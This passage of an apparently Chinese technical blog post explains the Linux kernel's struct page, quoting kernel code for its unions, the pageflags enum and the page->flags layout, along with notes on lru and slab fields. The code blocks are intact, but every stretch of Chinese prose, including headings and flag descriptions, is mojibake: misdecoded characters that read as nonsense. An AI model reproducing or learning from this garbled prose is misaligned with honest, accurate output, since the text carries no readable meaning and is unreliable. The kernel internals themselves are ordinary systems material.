class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* page_pool used by netstack */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @pp_magic: magic value to avoid recycling non</span></span><br><span class="line"><span class="comment"> * page_pool allocated pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pp_magic;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_pool</span> *<span class="title">pp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _pp_mapping_pad;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> dma_addr;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * dma_addr_upper: might require a 64-bit</span></span><br><span class="line"><span class="comment"> * value on 32-bit architectures.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> dma_addr_upper;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For frag page support, not supported in</span></span><br><span class="line"><span class="comment"> * 32-bit architectures with 64-bit DMA.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span> pp_frag_count;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Tail pages of compound page */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> compound_head;<span class="comment">/* Bit zero is set */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line"><span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line"><span class="keyword">void</span> *zone_device_data;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment"> * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment"> * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment"> * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment"> * private memory.</span></span><br><span class="line"><span class="comment"> * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment"> * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment"> * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** @rcu_head: You can use this to free a page by RCU. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span><span class="comment">/* This union is 4 bytes in size. */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page can be mapped to userspace, encodes the number</span></span><br><span class="line"><span class="comment"> * of times this page is referenced by a page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the page is neither PageSlab nor mappable to userspace,</span></span><br><span class="line"><span class="comment"> * the value stored here may help determine what this page</span></span><br><span class="line"><span class="comment"> * is used for.  See page-flags.h for a list of page types</span></span><br><span class="line"><span class="comment"> * which are currently stored here.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> page_type;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Usage count. *DO NOT USE DIRECTLY*. See page_ref.h */</span></span><br><span class="line"><span class="keyword">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On machines where all RAM is mapped into kernel address space,</span></span><br><span class="line"><span class="comment"> * we can simply calculate the virtual address. On machines with</span></span><br><span class="line"><span class="comment"> * highmem some memory is mapped into kernel virtual memory</span></span><br><span class="line"><span class="comment"> * dynamically, so we need a place to store that address.</span></span><br><span class="line"><span class="comment"> * Note that this field could be 16 bits on x86 ... ;)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Architectures with slow multiplication can define</span></span><br><span class="line"><span class="comment"> * WANT_PAGE_VIRTUAL in asm/page.h</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">virtual</span>;<span class="comment">/* Kernel virtual address (NULL if</span></span><br><span class="line"><span class="comment">   not kmapped, ie. highmem) */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KMSAN</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * KMSAN metadata for this page:</span></span><br><span class="line"><span class="comment"> *  - shadow page: every bit indicates whether the corresponding</span></span><br><span class="line"><span class="comment"> *    bit of the original page is initialized (0) or not (1);</span></span><br><span class="line"><span class="comment"> *  - origin page: every 4 bytes contain an id of the stack trace</span></span><br><span class="line"><span class="comment"> *    where the uninitialized value was created.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">kmsan_shadow</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">kmsan_origin</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LAST_CPUPID_NOT_IN_PAGE_FLAGS</span></span><br><span class="line"><span class="keyword">int</span> _last_cpupid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; _struct_page_alignment;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­pageç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸Šï¼Œè¿™é‡Œä¸ä¼šå°†å…¨éƒ¨æˆå‘˜çš„å«ä¹‰è¿›è¡Œè§£é‡Šåªä¼šè§£é‡Šè¾ƒä¸ºé‡è¦æˆ–æ˜¯åæ–‡ä¸­éœ€è¦çš„ã€‚</p><h3 id="flagsï¼šæ ‡å¿—ä½"><a href="#flagsï¼šæ ‡å¿—ä½" class="headerlink" title="flagsï¼šæ ‡å¿—ä½"></a>flagsï¼šæ ‡å¿—ä½</h3><p>è¿™ä¸ªæˆå‘˜çš„å«ä¹‰å¾ˆæ˜æ˜¾ï¼Œç”¨äºè¡¨ç¤ºè¯¥é¡µå¤„äºä»€ä¹ˆæ ·çš„çŠ¶æ€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">PG_locked,<span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">PG_writeback,<span class="comment">/* Page is under writeback */</span></span><br><span class="line">PG_referenced,</span><br><span class="line">PG_uptodate,</span><br><span class="line">PG_dirty,</span><br><span class="line">PG_lru,</span><br><span class="line">PG_head,<span class="comment">/* Must be in bit 6 */</span></span><br><span class="line">PG_waiters,<span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">PG_active,</span><br><span class="line">PG_workingset,</span><br><span class="line">PG_error,</span><br><span class="line">PG_slab,</span><br><span class="line">PG_owner_priv_1,<span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">PG_arch_1,</span><br><span class="line">PG_reserved,</span><br><span class="line">PG_private,<span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">PG_private_2,<span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">PG_mappedtodisk,<span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">PG_reclaim,<span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">PG_swapbacked,<span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">PG_unevictable,<span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">PG_mlocked,<span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">PG_uncached,<span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">PG_hwpoison,<span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_PAGE_IDLE_FLAG) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">PG_young,</span><br><span class="line">PG_idle,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ARCH_USES_PG_ARCH_X</span></span><br><span class="line">PG_arch_2,</span><br><span class="line">PG_arch_3,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">PG_readahead = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Depending on the way an anonymous folio can be mapped into a page</span></span><br><span class="line"><span class="comment"> * table (e.g., single PMD/PUD/CONT of the head page vs. PTE-mapped</span></span><br><span class="line"><span class="comment"> * THP), PG_anon_exclusive may be set only for the head page or for</span></span><br><span class="line"><span class="comment"> * tail pages of an anonymous folio. For now, we only expect it to be</span></span><br><span class="line"><span class="comment"> * set on tail pages for PTE-mapped THP.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_anon_exclusive = PG_mappedtodisk,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Filesystems */</span></span><br><span class="line">PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* SwapBacked */</span></span><br><span class="line">PG_swapcache = PG_owner_priv_1,<span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment"> * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment"> * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PG_fscache = PG_private_2,<span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* XEN */</span></span><br><span class="line"><span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">PG_pinned = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">PG_savepinned = PG_dirty,</span><br><span class="line"><span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">PG_foreign = PG_owner_priv_1,</span><br><span class="line"><span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">PG_reported = PG_uptodate,</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* For self-hosted memmap pages */</span></span><br><span class="line">PG_vmemmap_self_hosted = PG_owner_priv_1,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags only valid for compound pages.  Stored in first tail page&#x27;s</span></span><br><span class="line"><span class="comment"> * flags word.  Cannot use the first 8 flags or any flag marked as</span></span><br><span class="line"><span class="comment"> * PF_ANY.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* At least one page in this folio has the hwpoison flag set */</span></span><br><span class="line">PG_has_hwpoisoned = PG_error,</span><br><span class="line">PG_hugetlb = PG_active,</span><br><span class="line">PG_large_rmappable = PG_workingset, <span class="comment">/* anon or file-backed */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„æšä¸¾ç±»å‹å˜é‡å°±å¯¹åº”äº†ä¸€ä¸ªé¡µçš„ä¸åŒçŠ¶æ€ã€‚</p><blockquote><p><code>PG_locked</code>ï¼šè¡¨ç¤ºè¯¥é¡µå·²è¢«ä¸Šé”ï¼Œè¯´æ˜æ­¤æ—¶è¯¥é¡µæ­£åœ¨è¢«ä½¿ç”¨</p><p><code>PG_referenced</code>ï¼šè¯¥é¡µåˆšåˆšè¢«è®¿é—®è¿‡ï¼Œè¯¥æ ‡å¿—ä½ä¸ <code>PG_reclaim</code> æ ‡å¿—ä½å…±åŒè¢«ç”¨äºåŒ¿åä¸æ–‡ä»¶å¤‡ä»½ç¼“å­˜çš„é¡µé¢å›æ”¶</p><p><code>PG_uptodate</code>ï¼šè¯¥é¡µå¤„åœ¨æœ€æ–°çŠ¶æ€ï¼Œå½“å¯¹è¯¥é¡µå®Œæˆä¸€æ¬¡è¯»å–æ—¶ï¼Œè¯¥é¡µä¾¿å˜æ›´ä¸º up-to-date çŠ¶æ€ï¼Œé™¤éå‘ç”Ÿäº†ç£ç›˜ IO é”™è¯¯</p><p><code>PG_dirty</code>ï¼šè¯¥é¡µä¸ºè„é¡µï¼Œå³è¯¥é¡µçš„å†…å®¹å·²è¢«ä¿®æ”¹ï¼Œåº”å½“å°½å¿«å°†å†…å®¹å†™å›ç£ç›˜ä¸Š</p><p><code>PG_lru</code>ï¼šè¯¥é¡µå¤„åœ¨ä¸€ä¸ª LRU é“¾è¡¨ä¸Š</p><p><code>PG_active</code>ï¼šè¯¥é¡µé¢ä½äºæ´»è·ƒ lru é“¾è¡¨ä¸­</p><p><code>PG_workingset</code>ï¼šè¯¥é¡µä½äºæŸä¸ªè¿›ç¨‹çš„å·¥ä½œé›†ï¼ˆå³ä¸€ä¸ªè¿›ç¨‹åŒæ—¶ä½¿ç”¨çš„å†…å­˜æ•°é‡ï¼Œä¾‹å¦‚ä¸€ä¸ªè¿›ç¨‹å¯èƒ½åˆ†é…äº†114514MBå†…å­˜ï¼Œä½†æ˜¯åœ¨åŒä¸€æ—¶åˆ»åªä½¿ç”¨å…¶ä¸­çš„1919MBï¼Œè¿™å°±æ˜¯å·¥ä½œé›†ï¼‰ä¸­</p><p><code>PG_waiters</code>ï¼šæœ‰è¿›ç¨‹åœ¨ç­‰å¾…è¯¥é¡µé¢</p><p><code>PG_error</code>ï¼šè¯¥é¡µåœ¨ I/O è¿‡ç¨‹ä¸­å‡ºç°äº†å·®é”™</p><p><code>PG_slab</code>ï¼šè¯¥é¡µç”± slab ä½¿ç”¨</p><p><code>PG_owner_priv_1</code>ï¼šè¯¥é¡µç”±å…¶æ‰€æœ‰è€…ä½¿ç”¨ï¼Œè‹¥æ˜¯ä½œä¸º pagecache é¡µé¢ï¼Œåˆ™å¯èƒ½æ˜¯è¢«æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨</p><p><code>PG_arch_1</code>ï¼šè¯¥æ ‡å¿—ä½ä¸ä½“ç³»ç»“æ„ç›¸å…³è”</p><p><code>PG_reserved</code>ï¼šè¯¥é¡µè¢«ä¿ç•™ï¼Œä¸èƒ½å¤Ÿè¢« swap outï¼ˆå†…æ ¸ä¼šå°†ä¸æ´»è·ƒçš„é¡µäº¤æ¢åˆ°ç£ç›˜ä¸Šï¼‰</p><p><code>PG_private</code> ï¼šè¯¥é¡µæ‹¥æœ‰ç§æœ‰æ•°æ®ï¼ˆprivate å­—æ®µï¼‰</p><p><code>PG_writeback</code>ï¼šè¯¥é¡µæ­£åœ¨è¢«å†™åˆ°ç£ç›˜ä¸Š</p><p><code>PG_head</code>ï¼šåœ¨å†…æ ¸ä¸­æœ‰æ—¶éœ€è¦å°†å¤šä¸ªé¡µç»„æˆä¸€ä¸ª compound pagesï¼Œè€Œè®¾ç½®è¯¥çŠ¶æ€æ—¶è¡¨æ˜è¯¥é¡µæ˜¯ compound pages çš„ç¬¬ä¸€ä¸ªé¡µ</p><p><code>PG_mappedtodisk</code>ï¼šè¯¥é¡µè¢«æ˜ å°„åˆ°ç¡¬ç›˜ä¸­</p><p><code>PG_reclaim</code>ï¼šè¯¥é¡µå¯ä»¥è¢«å›æ”¶</p><p><code>PG_swapbacked</code>ï¼šè¯¥é¡µçš„åå¤‡å­˜å‚¨å™¨ä¸º swap/RAM</p><p><code>PG_unevictable</code>ï¼šè¯¥é¡µä¸å¯è¢«å›æ”¶ï¼ˆè¢«é”ï¼‰ï¼Œä¸”ä¼šå‡ºç°åœ¨ <code>LRU_UNEVICTABLE</code> é“¾è¡¨ä¸­</p><p><code>PG_mlocked</code>ï¼šè¯¥é¡µè¢«å¯¹åº”çš„ vma ä¸Šé”ï¼ˆé€šå¸¸æ˜¯ç³»ç»Ÿè°ƒç”¨ mlockï¼‰</p><p><code>PG_uncached</code>ï¼šè¯¥é¡µè¢«è®¾ç½®ä¸ºä¸å¯ç¼“å­˜</p><p><code>PG_hwpoison</code>ï¼šç¡¬ä»¶ç›¸å…³çš„æ ‡å¿—ä½</p><p><code>PG_arch_2</code>ï¼š64ä½ä¸‹çš„ä½“ç³»ç»“æ„ç›¸å…³æ ‡å¿—ä½</p></blockquote><p><code>flags</code>æ ‡å¿—ä½è¿˜å­˜åœ¨å¤ç”¨çš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * page-&gt;flags layout:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are five possibilities for how page-&gt;flags get laid out.  The first</span></span><br><span class="line"><span class="comment"> * pair is for the normal case without sparsemem. The second pair is for</span></span><br><span class="line"><span class="comment"> * sparsemem when there is plenty of space for node and section information.</span></span><br><span class="line"><span class="comment"> * The last is when there is insufficient space in page-&gt;flags and a separate</span></span><br><span class="line"><span class="comment"> * lookup is necessary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p><code>flags</code>å­—æ®µä¼šä¸ºäº†èŠ‚çœå†…å­˜ä¸å…¶ä»–ç»“æ„å…±ç”¨ç©ºé—´ï¼Œå…·ä½“åˆ’åˆ†å½¢å¼ä¸å†…æ ¸é…ç½®çš„å†…å­˜æ¨¡å‹æœ‰å…³ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢è®²èµ·è¯æ°›å›´äº†äº”ç§ï¼Œå…¶å®æ˜¯ä¸‰å¤§ç§ã€‚</p><p>ç¬¬ä¸€ç§ï¼š<strong>ésparseå†…å­˜æ¨¡å¼</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/8J9pm3n1eZuTKi6.png"                                     ></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½ä½ç”¨ä½œè¯¥ page çš„ flagï¼Œé«˜ä½åˆ†åˆ«æ ‡è¯†å…¶å½’å±çš„ zoneï¼Œ node idï¼ˆé NUMA ç³»ç»Ÿä¸­ä¸º0ï¼‰ï¼Œä¸­é—´å‰©ä½™çš„ä½ä¿ç•™ã€‚</p><p>ç¬¬äºŒç§ï¼š<strong>sparseå†…å­˜æ¨¡å¼</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/CETbQSKwV8er5OR.png"                                     ></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç›¸æ¯”èµ·ç¬¬ä¸€ç§å½¢å¼å¤šäº†ä¸€ä¸ª SECTION å­—æ®µæ ‡è¯†å…¶å½’å±çš„ <code>mem_section</code>ã€‚</p><p>ç¬¬ä¸‰ç§ï¼š<strong>æ²¡æœ‰Nodeçš„sparseå†…å­˜æ¨¡å¼</strong></p><p>å³åœ¨ç¬¬äºŒç§çš„åŸºç¡€ä¸Šå»æ‰nodeå­—æ®µã€‚è¿™ä¸€æ¨¡å¼ä¸»è¦é€‚ç”¨äºéNUMAç³»ç»Ÿï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹å–æ¶ˆäº†NODEç»“æ„ã€‚</p><h3 id="lruï¼šé“¾è¡¨èŠ‚ç‚¹"><a href="#lruï¼šé“¾è¡¨èŠ‚ç‚¹" class="headerlink" title="lruï¼šé“¾è¡¨èŠ‚ç‚¹"></a>lruï¼šé“¾è¡¨èŠ‚ç‚¹</h3><p>lruå¤§å®¶åº”è¯¥éƒ½æ˜¯è¾ƒä¸ºç†Ÿæ‚‰çš„ï¼Œåœ¨æ“ä½œç³»ç»Ÿè¯¾ä¸Šå­¦ä¹ è¿‡é¡µé¢ç½®æ¢ç®—æ³•ã€‚</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/QbuxcXTWdzMari5.png"                                     ></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œpageç»“æ„ä½“ç”±lruç»„ç»‡æˆé“¾è¡¨ã€‚</p><h3 id="slabï¼šç›¸å…³ç»“æ„ä½“"><a href="#slabï¼šç›¸å…³ç»“æ„ä½“" class="headerlink" title="slabï¼šç›¸å…³ç»“æ„ä½“"></a>slabï¼šç›¸å…³ç»“æ„ä½“</h3><p>åœ¨ä½ç‰ˆæœ¬çš„pageç»“æ„ä½“ä¸­ä¸“é—¨æœ‰ä¸€ä¸ªåŒ¿åå˜é‡ç”¨æ¥å­˜æ”¾äºslabç›¸å…³çš„æˆå‘˜çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* slab, slob and slub */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Partial pages */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line"><span class="keyword">int</span> pages;<span class="comment">/* Nr of pages left */</span></span><br><span class="line"><span class="keyword">int</span> pobjects;<span class="comment">/* Approximate count */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pages;</span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* not slob */</span></span><br><span class="line"><span class="comment">/* Double-word boundary */</span></span><br><span class="line"><span class="keyword">void</span> *freelist;<span class="comment">/* first free object */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> *s_mem;<span class="comment">/* slab: first object */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> counters;<span class="comment">/* SLUB */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* SLUB */</span></span><br><span class="line"><span class="keyword">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line"><span class="keyword">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line"><span class="keyword">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…³äºslabçš„å†…å®¹å°±ä¸å¤šèµ˜è¿°äº†ï¼Œå¯ä»¥çœ‹å‰ä¸€ç¯‡æ–‡ç«  <a class="link"   href="https://cv196082.gitee.io/2023/11/23/Pspray-Timing-Side-Channel-based-Linux-Kernel-Heap-Exploitation-Technique/" >Pspray: Timing Side-Channel based Linux Kernel Heap Exploitation Technique<i class="fas fa-external-link-alt"></i></a> ã€‚</p><h3 id="mapcountï¼šæ˜ å°„è®¡æ•°"><a href="#mapcountï¼šæ˜ å°„è®¡æ•°" class="headerlink" title="_mapcountï¼šæ˜ 